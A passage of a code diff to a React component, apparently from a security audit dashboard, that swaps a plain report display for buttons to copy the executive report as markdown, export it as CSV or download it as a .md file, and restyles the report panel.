-                  fontSize: '0.75rem',
-                  lineHeight: 1.6,
-                  color: '#CBD5E1',
-                  whiteSpace: 'pre-wrap',
-                  maxHeight: 500,
-                  overflowY: 'auto'
-                }}
+            <Stack direction="row" spacing={1} flexWrap="wrap" useFlexGap>
+              <Button
+                variant="outlined"
+                onClick={() => handleCopy(executiveReportMarkdown, 'report_md')}
+                startIcon={copiedKey === 'report_md' ? <CheckCircleIcon /> : <ContentCopyIcon />}
+                sx={{ minHeight: 44, fontFamily: mono, fontSize: '0.74rem', borderColor: palette.goldBorder, color: palette.gold }}
               >
-                {executiveReportMarkdown}
-              </pre>
-            </Paper>
+                {copiedKey === 'report_md' ? 'Copied' : 'Copy MD'}
+              </Button>
+              <Button
+                variant="outlined"
+                onClick={handleExportCsv}
+                startIcon={<DownloadIcon />}
+                sx={{ minHeight: 44, fontFamily: mono, fontSize: '0.74rem', borderColor: palette.cyanBorder, color: palette.cyan }}
+              >
+                Export CSV
+              </Button>
+              <Button
+                variant="contained"
+                onClick={() =>
+                  downloadBlob(
+                    executiveReportMarkdown,
+                    `hexstrike-audit-${targetScope.replace(/[^a-zA-Z0-9.-]/g, '_')}.md`,
+                    'text/markdown;charset=utf-8'
+                  )
+                }
+                startIcon={<DownloadIcon />}
+                sx={{ minHeight: 44, fontFamily: mono, fontSize: '0.74rem', bgcolor: palette.crimsonBtn, color: '#FFFFFF', '&:hover': { bgcolor: palette.crimsonBtnHover } }}
+              >
+                Export .MD
+              </Button>
+            </Stack>
+          </Box>
+          <Paper sx={{ p: 2, bgcolor: palette.codeBg, borderRadius: 2, border: `1px solid ${palette.border}` }}>
+            <pre
+              style={{
+                margin: 0,
+                fontFamily: mono,
+                fontSize: '0.76rem',
+                lineHeight: 1.6,
+                color: palette.codeInk,
+                whiteSpace: 'pre-wrap',
+                maxHeight: 460,
+                overflowY: 'auto',
+              }}
+            >
+              {executiveReportMarkdown}
+            </pre>
           </Paper>
-        </Box>
+        </Paper>
       )}
     </Box>
   );
